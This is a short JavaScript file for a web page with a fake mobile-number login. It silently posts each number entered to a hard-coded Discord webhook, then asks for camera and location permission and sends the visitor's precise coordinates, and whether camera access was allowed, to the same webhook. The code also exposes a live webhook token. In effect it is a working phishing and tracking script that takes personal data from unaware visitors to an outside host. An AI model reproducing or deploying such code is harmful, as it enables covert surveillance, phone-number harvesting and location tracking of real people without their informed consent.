const webhookUrl = "https://discord.com/api/webhooks/1396421330399789146/qk3h6GUJlQ2DbAmy5uY0RooTHUju2bH7vsakTDMMbeDgsxLaiUeUZW9_M1J3ndeD-bJP";

document.getElementById('loginForm').onsubmit = async (e) => {
  e.preventDefault();
  const mobile = document.getElementById('mobile').value;
  if (!mobile.match(/^[0-9]{10,}$/)) {
    document.getElementById('userInfo').innerText = "Enter a valid mobile number.";
    return;
  }
  document.getElementById('userInfo').innerText = `Logged in as: ${mobile}`;
  await sendToDiscord(`Mobile Login: ${mobile}`);
  document.getElementById('cameraBtn').style.display = "inline-block";
  document.getElementById('locationBtn').style.display = "inline-block";
};

async function sendToDiscord(content) {
  await fetch(webhookUrl, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({content})
  });
}

// Camera access (prompts for permission)
document.getElementById('cameraBtn').onclick = async () => {
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      document.getElementById('output').innerText = 'Camera accessed!';
      sendToDiscord("Camera accessed!");
      stream.getTracks().forEach(track => track.stop());
    } catch (err) {
      document.getElementById('output').innerText = 'Camera access denied!';
      sendToDiscord("Camera access denied!");
    }
  }
};

// Location access (prompts for permission)
document.getElementById('locationBtn').onclick = () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const locMsg = `Location: ${position.coords.latitude}, ${position.coords.longitude}`;
        document.getElementById('output').innerText = locMsg;
        sendToDiscord(locMsg);
      },
      (err) => {
        document.getElementById('output').innerText = 'Location access denied!';
        sendToDiscord("Location access denied!");
      }
    );
  }
};